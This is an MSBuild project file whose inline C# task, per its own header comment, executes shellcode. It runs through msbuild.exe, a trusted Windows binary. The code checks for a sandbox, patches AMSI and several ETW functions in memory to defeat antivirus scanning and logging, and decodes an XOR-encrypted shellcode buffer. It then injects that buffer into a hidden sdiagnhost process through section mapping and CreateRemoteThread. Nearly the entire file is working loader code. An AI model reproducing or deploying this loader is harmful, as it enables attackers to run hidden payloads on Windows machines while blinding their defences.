<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <BuildIt />
  </Target>
  <UsingTask TaskName="BuildIt" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
		using System.Diagnostics;
		using System.Net;
		using System.Runtime.InteropServices;
		using System.Text;
		using System.IO;
		using Microsoft.Win32;

        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class BuildIt :  Task, ITask
        {         
			[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
			static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
		static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
	 
		[DllImport("ntdll.dll", SetLastError=true)]
		static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, ref IntPtr ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

		[DllImport("ntdll.dll", SetLastError=true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
		static extern int NtClose(IntPtr hObject);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

			[DllImport("kernel32.dll")]
			static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern UInt32 FlsAlloc(IntPtr lpCallback);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);


			
			public override bool Execute()
			{
			DateTime t1 = DateTime.Now;
			Sleep(2000);
			double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
			if(t2 < 1.5)
			{
				return true;
			}


			UInt32 result = FlsAlloc(IntPtr.Zero);
			if (result == 0xFFFFFFFF)
			{
				return true;
			}


			IntPtr amsi_os_address = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiOpenSession");
			bool wpm_return;
			if(IntPtr.Size == 8)
			{
				byte[] patch_buf = new byte[3] {0x48, 0x31, 0xC0};
				IntPtr out_written;
				wpm_return = WriteProcessMemory(GetCurrentProcess(), amsi_os_address, patch_buf, patch_buf.Length, out out_written);
				wpm_return = WriteProcessMemory(GetCurrentProcess(), (IntPtr)((UInt64)amsi_os_address + 5), patch_buf, patch_buf.Length, out out_written);
			}
			else if(IntPtr.Size == 4)
			{
				byte[] patch_buf = new byte[2] {0x31, 0xC0}; 
				IntPtr out_written;
				wpm_return = WriteProcessMemory(GetCurrentProcess(), (IntPtr)((UInt32)amsi_os_address + 8), patch_buf, patch_buf.Length, out out_written);
				wpm_return = WriteProcessMemory(GetCurrentProcess(), (IntPtr)((UInt32)amsi_os_address + 15), patch_buf, patch_buf.Length, out out_written);
			}


			
			String[] Etw_Functions = new string[4];
			Etw_Functions[0] = "EtwNotificationRegister";
			Etw_Functions[1] = "EtwEventRegister";
			Etw_Functions[2] = "EtwEventWrite";
			Etw_Functions[3] = "EtwEventWriteFull";
			IntPtr etw_address = IntPtr.Zero;
			IntPtr bytes_written = IntPtr.Zero;
			if (IntPtr.Size == 8)
			{
				byte[] etw_patch = new byte[8] { 0x48, 0x33, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00 };
					for (int k = 0; k < Etw_Functions.Length; k++)
					{
						etw_address = GetProcAddress(GetModuleHandle("ntdll.dll"), Etw_Functions[k]);
						wpm_return = WriteProcessMemory(GetCurrentProcess(), etw_address, etw_patch, 8, out bytes_written);
					}
				}
				else
				{
					byte[] etw_patch = new byte[8] { 0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00 };
					for (int k = 0; k < Etw_Functions.Length; k++)
					{
						etw_address = GetProcAddress(GetModuleHandle("ntdll.dll"), Etw_Functions[k]);
						wpm_return = WriteProcessMemory(GetCurrentProcess(), etw_address, etw_patch, 8, out bytes_written);
					}
				}


			byte[] buf = new byte[774] {0x98, 0x33, 0xEA, 0x9C, 0x9A, 0x90, 0xA8, 0x6B, 0x6B, 0x78, 0x29, 0x37, 0x33, 0x3B, 0x39, 0x40, 0x59, 0xB6, 0x0F, 0x33, 0xF2, 0x26, 0x0A, 0x30, 0xE9, 0x39, 0x83, 0x40, 0xF3, 0x36, 0x54, 0x3C, 0x35, 0x43, 0x59, 0xAF, 0x2C, 0xF2, 0x19, 0x28, 0x32, 0x71, 0xDD, 0x31, 0x31, 0x40, 0x59, 0xA8, 0xC8, 0x5F, 0x0C, 0x14, 0x6C, 0x54, 0x54, 0x2C, 0xAC, 0xBF, 0x6D, 0x27, 0x73, 0xAC, 0x89, 0xA3, 0x3C, 0x30, 0xE9, 0x39, 0x4B, 0xFD, 0x2C, 0x64, 0x2C, 0x6C, 0xBB, 0x37, 0x39, 0x0A, 0xF3, 0x23, 0x83, 0x7D, 0x6C, 0x71, 0xEF, 0x19, 0x6B, 0x78, 0x6A, 0xED, 0xF4, 0xF3, 0x6B, 0x78, 0x6A, 0x30, 0xEF, 0xAB, 0x17, 0x19, 0x32, 0x67, 0xC4, 0x27, 0xF2, 0x38, 0x4A, 0x38, 0x2B, 0x6C, 0xBB, 0xFD, 0x32, 0x80, 0x91, 0x35, 0x30, 0x47, 0xB1, 0x30, 0x95, 0xB4, 0x2C, 0xFD, 0x56, 0xF0, 0x2C, 0x6C, 0xB5, 0x40, 0x59, 0xA8, 0xC8, 0x2C, 0xAC, 0xBF, 0x6D, 0x27, 0x73, 0xAC, 0x63, 0x98, 0x15, 0x97, 0x28, 0x6A, 0x2F, 0x5C, 0x72, 0x2B, 0x5B, 0xBC, 0x18, 0xB0, 0x42, 0x2C, 0xE9, 0x2B, 0x47, 0x3F, 0x69, 0xB8, 0x0E, 0x2C, 0xF2, 0x84, 0x32, 0x2C, 0xE9, 0x2B, 0x7F, 0x3F, 0x69, 0xB8, 0x33, 0xF2, 0x67, 0x00, 0x32, 0x67, 0xC4, 0x2C, 0x43, 0x37, 0x42, 0x42, 0x3B, 0x41, 0x2C, 0x30, 0x29, 0x3F, 0x33, 0x41, 0x33, 0xF5, 0x8E, 0x48, 0x33, 0x39, 0x9E, 0x98, 0x42, 0x27, 0x3B, 0x41, 0x33, 0xFD, 0x7C, 0x8F, 0x29, 0x9E, 0x9E, 0x91, 0x3D, 0x30, 0x63, 0xC2, 0x3A, 0x3F, 0xE0, 0x19, 0x0B, 0x0D, 0x14, 0x22, 0x05, 0x1C, 0x74, 0x2C, 0x35, 0x40, 0xF1, 0x87, 0x2B, 0xA6, 0xA9, 0x44, 0x17, 0x4A, 0x6D, 0x9E, 0xB8, 0x25, 0x3B, 0x30, 0xEB, 0x8C, 0x3A, 0x2E, 0x2D, 0x57, 0xB4, 0x30, 0x5C, 0xBF, 0x3B, 0x35, 0x2B, 0xE1, 0x61, 0x2A, 0x21, 0xC9, 0x74, 0x6B, 0x6B, 0x78, 0x9F, 0xBB, 0x8C, 0x6D, 0x6B, 0x78, 0x6A, 0x57, 0x5B, 0x59, 0x4D, 0x47, 0x58, 0x60, 0x46, 0x57, 0x64, 0x62, 0x57, 0x59, 0x74, 0x41, 0x33, 0xFF, 0xA9, 0x2F, 0xAD, 0xAB, 0xE2, 0x77, 0x6A, 0x68, 0x27, 0x5C, 0xB4, 0x25, 0x3B, 0x0E, 0x71, 0x3A, 0x34, 0xCE, 0x37, 0xEF, 0xF5, 0xA5, 0x6B, 0x78, 0x6A, 0x68, 0x95, 0xB8, 0x93, 0xB4, 0x6A, 0x68, 0x74, 0x4E, 0x12, 0x05, 0x34, 0x55, 0x1F, 0x58, 0x58, 0x10, 0x39, 0x5F, 0x0F, 0x2E, 0x5B, 0x21, 0x3F, 0x37, 0x5E, 0x55, 0x2F, 0x25, 0x4D, 0x37, 0x1F, 0x50, 0x18, 0x17, 0x29, 0x30, 0x3D, 0x57, 0x3C, 0x2B, 0x21, 0x3F, 0x06, 0x3E, 0x09, 0x43, 0x1B, 0x1E, 0x25, 0x23, 0x19, 0x4A, 0x28, 0x57, 0x28, 0x29, 0x59, 0x16, 0x13, 0x2B, 0x0C, 0x59, 0x3A, 0x37, 0x29, 0x05, 0x05, 0x2A, 0x0E, 0x0E, 0x58, 0x35, 0x13, 0x18, 0x63, 0x31, 0x37, 0x10, 0x5C, 0x10, 0x0D, 0x0C, 0x28, 0x41, 0x05, 0x30, 0x17, 0x45, 0x2E, 0x2A, 0x2D, 0x0A, 0x35, 0x15, 0x16, 0x13, 0x5E, 0x1A, 0x1A, 0x25, 0x31, 0x16, 0x1C, 0x1A, 0x3E, 0x3B, 0x55, 0x36, 0x1F, 0x36, 0x33, 0x27, 0x22, 0x2A, 0x2E, 0x5C, 0x39, 0x09, 0x19, 0x0C, 0x5E, 0x25, 0x28, 0x06, 0x2E, 0x09, 0x3A, 0x09, 0x3E, 0x3E, 0x21, 0x34, 0x05, 0x44, 0x32, 0x4B, 0x3F, 0x16, 0x24, 0x10, 0x0C, 0x46, 0x1A, 0x37, 0x3C, 0x17, 0x30, 0x63, 0x16, 0x10, 0x25, 0x56, 0x07, 0x4A, 0x34, 0x5C, 0x20, 0x28, 0x2A, 0x2C, 0x3B, 0x35, 0x06, 0x08, 0x35, 0x07, 0x11, 0x1B, 0x20, 0x26, 0x16, 0x4B, 0x62, 0x11, 0x2A, 0x1A, 0x32, 0x07, 0x08, 0x37, 0x11, 0x08, 0x63, 0x48, 0x2E, 0x59, 0x3F, 0x3C, 0x55, 0x42, 0x25, 0x29, 0x5F, 0x37, 0x56, 0x07, 0x2F, 0x40, 0x31, 0x39, 0x33, 0x22, 0x1B, 0x3E, 0x0C, 0x37, 0x2E, 0x40, 0x27, 0x32, 0x11, 0x43, 0x21, 0x43, 0x59, 0x29, 0x32, 0x41, 0x5A, 0x06, 0x1C, 0x5C, 0x44, 0x12, 0x07, 0x1F, 0x6A, 0x30, 0xEB, 0xAC, 0x3A, 0x2E, 0x29, 0x40, 0x27, 0x5C, 0xB4, 0x25, 0x32, 0xE0, 0x74, 0x59, 0xD3, 0xFC, 0x6A, 0x68, 0x74, 0x6B, 0x3B, 0x25, 0x3B, 0x2F, 0xAD, 0xA9, 0x92, 0x2B, 0x50, 0x5D, 0x95, 0xB8, 0x33, 0xFF, 0xA8, 0x0E, 0x6A, 0x3E, 0x33, 0xFF, 0x99, 0x0E, 0x75, 0x41, 0x39, 0x20, 0xEA, 0x55, 0x74, 0x6B, 0x34, 0xFF, 0x8A, 0x0E, 0x70, 0x2C, 0x44, 0x3F, 0xE4, 0x1B, 0x2E, 0xFD, 0xE5, 0x78, 0x6A, 0x68, 0x74, 0x9E, 0xB8, 0x43, 0x59, 0xA8, 0x41, 0x41, 0x33, 0xFF, 0x99, 0x33, 0x63, 0xB4, 0x30, 0x47, 0xB1, 0x35, 0x41, 0x34, 0xA6, 0xB6, 0x4D, 0x6A, 0x7C, 0x22, 0x9E, 0xAB, 0xE5, 0xA8, 0x1F, 0x7E, 0x33, 0xB9, 0xA9, 0xF0, 0x81, 0x6B, 0x6B, 0x3F, 0xE4, 0x2C, 0xA4, 0x58, 0x8B, 0x78, 0x6A, 0x68, 0x74, 0x9E, 0xB8, 0x40, 0x9F, 0xB1, 0x20, 0x69, 0x92, 0xDE, 0x92, 0x3B, 0x74, 0x6B, 0x6B, 0x25, 0x41, 0x0E, 0x34, 0x41, 0x34, 0xFF, 0xB9, 0xA7, 0x92, 0x7B, 0x34, 0xB9, 0xAA, 0x68, 0x84, 0x6B, 0x6B, 0x3F, 0xE4, 0x40, 0xD0, 0x3A, 0x88, 0x78, 0x6A, 0x68, 0x74, 0x9E, 0xB8, 0x40, 0xFB, 0x35, 0x41, 0x33, 0xF4, 0x99, 0x32, 0xEF, 0xA3, 0x33, 0xF4, 0xAE, 0x31, 0xA9, 0xB4, 0x6B, 0x4B, 0x78, 0x6A, 0x2F, 0xEB, 0xA4, 0x34, 0xCE, 0x7C, 0xFA, 0xEB, 0x89, 0x6B, 0x78, 0x6A, 0x68, 0x95, 0xB8, 0x33, 0xF5, 0xA6, 0x48, 0xEF, 0xAB, 0x17, 0xC6, 0x08, 0xED, 0x6D, 0x33, 0x6C, 0xB5, 0xE5, 0xA8, 0x1F, 0xB9, 0x43, 0xB5, 0x42, 0x0E, 0x74, 0x44, 0xE2, 0x98, 0x7D, 0x4E, 0x6A, 0x2C, 0xF4, 0xAE, 0x9F, 0xBB};

			for(int i = 0; i < buf.Length; i++)
			{
				buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
			}



			string key = "offsec";
			byte[] key_bytes = System.Text.Encoding.UTF8.GetBytes(key);
			for(int k = 0; k < buf.Length; k++)
			{
				buf[k] = (byte)(buf[k] ^ key_bytes[k % key.Length]);
			}



			string process_injection_target = "sdiagnhost";


				Process process_to_inject_into = new Process();
				process_to_inject_into.StartInfo.FileName = process_injection_target;
				process_to_inject_into.StartInfo.CreateNoWindow = true;
				process_to_inject_into.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process_to_inject_into.Start();
				//PROCESS_INSTANCE_START
                
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, process_to_inject_into.Id);


			IntPtr buf_size = (IntPtr)buf.Length;

			IntPtr SectionHandle = IntPtr.Zero;
			uint MaximumSize = 2048;
			uint SEC_COMMIT = 0x08000000;
			uint SECTION_MAP_WRITE = 0x0002;
			uint SECTION_MAP_READ = 0x0004;
			uint SECTION_MAP_EXECUTE = 0x0008;
			uint PAGE_EXECUTE_READWRITE = 0x40;
			uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;

			uint create_section_return = NtCreateSection(ref SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT,IntPtr.Zero);

			IntPtr addr = IntPtr.Zero;
			IntPtr new_process_addr = IntPtr.Zero;
			UInt32 view_disposition = 1;
			UInt32 allocation_type = 0;

			uint map_view_return = NtMapViewOfSection(SectionHandle, GetCurrentProcess(), ref new_process_addr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref buf_size, view_disposition, allocation_type, PAGE_EXECUTE_READWRITE);

			Marshal.Copy(buf, 0, new_process_addr, buf.Length);

			map_view_return = NtMapViewOfSection(SectionHandle, hProcess, ref addr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref buf_size, view_disposition, allocation_type, PAGE_EXECUTE_READWRITE);

			uint unmap_return = NtUnmapViewOfSection(SectionHandle, new_process_addr);

			int ntclose_return = NtClose(SectionHandle);
                
				IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);


			
				return true;
			}

        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

